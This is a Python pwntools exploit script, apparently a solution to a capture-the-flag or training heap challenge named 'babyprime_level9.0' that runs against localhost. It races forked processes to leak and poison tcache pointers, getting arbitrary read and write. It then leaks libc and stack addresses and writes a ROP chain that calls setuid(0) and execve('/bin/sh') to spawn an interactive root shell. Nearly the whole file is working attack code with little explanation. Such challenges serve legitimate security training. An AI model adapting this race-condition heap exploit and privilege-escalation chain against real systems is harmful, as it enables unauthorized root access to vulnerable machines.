import time 
from pwn import *
import os

idx = 2

	
def leak_tcache(r1, r2):
	if os.fork() == 0: # .fork() duplicates a new process. There will be exactly two processes - child and parent running the same python script at the same time
	
	# os.fork() == 0 is the child, child does the following
		for _ in range(10000):
			r1.sendline(b"malloc 0")
			r1.sendline(b"scanf 0")
			r1.sendline(b"AAAABBBB")
			r1.sendline(b"free 0") # hope for write() of printf to go right after this
		exit(0) # kills the child
		
	# else, parent (os.fork() returns pid
	else:
		for _ in range(10000):
			r2.sendline(b"printf 0")
		os.wait() # waits for the child to finish
	output_set = set(r2.clean().splitlines())
	# .clean() gets the output
	# .splitlines() split the output by lines
	# set() gets the unique lines
	print(output_set)
	for output in output_set:
		output = output[9:]
		if output[:1] != b'\x41' and b'\x07' in output: # for bytes object, output[i] outputs integer
			result = output[:6]
			print(result)
			return u64(result.ljust(8, b'\x00'))
	
	return 0

def controlled_allocations(r1, r2, addr, heap_base_addr, debug, free):
	global idx
	r1.clean()
	r2.clean()
	
#	if free:
#		if debug:	
			#r1.interactive()
		#r1.sendline(f"free 1".encode()) # free B
		#r1.sendline(f"free 0".encode()) # free B		
		
	addr_packed = p64(addr ^ heap_base_addr)
	xor_result = addr ^ heap_base_addr
	print(f"addr: {hex(addr)}")
	print(f"heap_base: {hex(heap_base_addr)}")  
	print(f"XOR result: {hex(xor_result)}")
	#r1.sendline(f"malloc {idx}".encode()) # chunk A
	print(f"{idx}")
	#if debug:	
		#r1.interactive()
	r1.sendline(f"malloc 0".encode()) # chunk B
	r1.sendline(f"malloc {idx}".encode()) # chunk B
	r1.sendline(f"free {idx}".encode()) # free B
	
	while True:
		#print("Running Arbitrary Read on Address: ", hex(addr))
		if os.fork() == 0:
			r1.sendline(f"free 0".encode()) # free A
			os.kill(os.getpid(), 9)
		else:
			r2.send((f"scanf 0 ".encode() + addr_packed + b"\n") * 2000)
			# trying to fit scanf i <addr> between "free A (i)" and "stored[i] == 0"
			# overwriting freed A's next pointer to be the target address
			os.wait()
		
		time.sleep(0.1)
		
		r1.sendline(f"malloc 0".encode()) # this malloc gets A
		r1.sendline(f"printf 0".encode())
		r1.readuntil(b"MESSAGE: ")
		stored = r1.readline()[:-1] #
	#	print(addr_packed.split(b'\x00')[0])
		
		if stored == addr_packed.split(b'\x00')[0]: # checks if A's stored address (next pointer) is exactly our injected address
			break
	
	r1.sendline(f"malloc {idx}".encode()) # gets B (returned at injected address's location
	r1.sendline(f"free 0".encode())
	r1.clean()
	idx += 2

def arbitrary_read(r1, r2, addr, heap_base_addr, debug, free):
	global idx
	controlled_allocations(r1, r2, addr, heap_base_addr, debug, free)
	#r1.interactive()
	
	r1.sendline(f"printf {idx - 2}".encode())
	
	r1.readuntil(b"MESSAGE: ")
	output = r1.readline()[:-1]
	leak = u64(output.ljust(8, b'\x00')) 
	#r1.sendline("free 1")
	return leak

def arbitrary_write(r1, r2, addr, heap_base_addr, content, debug, free):
	global idx
	controlled_allocations(r1, r2, addr, heap_base_addr, debug, free)
	r1.sendline(f"scanf {idx - 2}".encode())
	r1.sendline(content)
	#r1.sendline(f"free 1".encode())
	
	
def exploit(r1, r2, p):
	
	
	leak = leak_tcache(r1, r2)
	
	if leak:
		#gdb.attach(p, s)
		
		print("tcache next pointer: ", hex(leak))
		
		# pivoting around memory, so we need to leak many times
		
		#gdb.attach(p, s)
		
		location1 = ( ( leak & ~0xff) << 12) + 0x8a0
		print(hex(location1))
		
		
		
		libc_leak = arbitrary_read(r1, r2, location1, leak, 0, 0)
				
		print("libc leak leak: ", hex(libc_leak))
		
		#gdb.attach(p, s)
		location2 = libc_leak + 0x60	
		leak3 = arbitrary_read(r1, r2, location2, leak, 0, 1) # pivot 
		
		
		
		location3 = leak3 - 0x100
		stack_leak = arbitrary_read(r1, r2, location3, leak, 0, 1)
		print("stack_leak: ", hex(stack_leak))
	
		
		rbp_addr = stack_leak - 0x810
		libc_base = libc_leak - 0x219c80
		
		# gadgets
		binsh_addr = libc_base + 0x1d8698
		setuid = libc_base + 0xec0d0
		system = libc_base + 0x50d70
		pop_rdi = libc_base + 0x000000000002a3e5
		pop_rsi = libc_base + 0x000000000002be51
		pop_rdx = libc_base + 0x00000000000796a2
		execve = libc_base + 0xeb080
		
		rbp_addr = stack_leak - 0x810
		libc_base = libc_leak - 0x219c80
		
		# gadgets
		binsh_addr = libc_base + 0x1d8698
		setuid = libc_base + 0xec0d0
		system = libc_base + 0x50d70
		pop_rdi = libc_base + 0x000000000002a3e5
		pop_rsi = libc_base + 0x000000000002be51
		pop_rdx = libc_base + 0x00000000000796a2
		execve = libc_base + 0xeb080
		
		payload = p64(0)
		payload += p64(pop_rdi)
		payload += p64(0)
		payload += p64(setuid)
		payload += p64(pop_rdi)
		payload += p64(binsh_addr)
		payload += p64(pop_rsi)
		payload += p64(rbp_addr + 0x98) # 0x98
		payload += p64(pop_rdx)
		payload += p64(0)
		payload += p64(execve)
		payload += p64(0)
		payload += p64(0)
		payload += p64(0)
		payload += p64(0)
		payload += p64(0)
		payload += p64(0)
		payload += p64(0)
		payload += p64(0)
		payload += p64(binsh_addr)
		payload += p64(0)
		
		s = '''
		'''
		arbitrary_write(r1, r2, rbp_addr, leak, payload, 0, 1)
		gdb.attach(p, s)
		
		try:
			r2.clean()
			p.clean()
			#r2.sendline("quit")
			#r2.sendline("ls")
			r2.interactive()
			
			#p.interactive()
			#response = r1.recvall(timeout=2)
			#response2 = r2.recvall(timeout=2)
			#print(response)
			#print(response2)
		except Exception as e:
			print(f"Final command execution failed: {e}")	
		
		return True
	else:
		#pause()
		print("Failed to leak")
		return False
	
def main(): 
	attempt = 0 
	while True:
		print(f"\nAttempt {attempt + 1}")
		
		global idx 
		idx = 2
		
		try: # code that might fail 
			binary = './babyprime_level9.0'
			p = process(binary)
			r1 = remote("localhost", 1337, timeout = 1)
			r2 = remote("localhost", 1337, timeout = 1)

			if exploit(r1, r2, p):
				break 
		except Exception as e: # what does the program do when `try` fails
			print(f"Error in attempt {attempt + 1}: {e}")
		finally: # code that always run no matter what
			try:
				r1.close()
				r2.close()
				p.kill()
			except:
				pass
		attempt += 1
	

if __name__ == "__main__":
	main()
